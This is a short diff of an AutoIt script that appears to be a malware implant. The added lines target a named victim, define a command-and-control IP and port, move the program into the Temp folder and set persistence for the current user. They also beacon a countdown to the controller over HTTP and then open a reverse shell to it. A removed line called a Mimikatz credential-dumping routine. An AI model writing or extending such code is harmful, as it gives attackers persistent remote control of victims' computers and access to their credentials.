@@ -3,19 +3,30 @@
 #include "libs/info.au3"
 #include "libs/misc.au3"
 
-$victim = "test"
+$victim = "john"
+$c2_ip = "192.168.231.106"
+$c2_port = "444"
+$timer = 60
 
-if isRunningFromTemp() Then
+init()
 
-   SetPersistent4CurrentUser()
+if InternetCheck() Then
 
-   Mimikatz()
+   If numberOfLogins(whoami()) > 2 Then
 
-Else
+	  Move2Temp()
 
-   if AmIusername($victim) Then
+	  SetPersistent4CurrentUser()
 
-	  CopyTempRun()
+	  While $timer > 0
+
+		 HttpPost($c2_ip, "Timer:", $timer)
+		 Sleep(1000)
+ 		 $timer = $timer - 1
+
+	  WEnd
+
+	  ReverseShell($c2_ip, $c2_port)
 
    EndIf
 
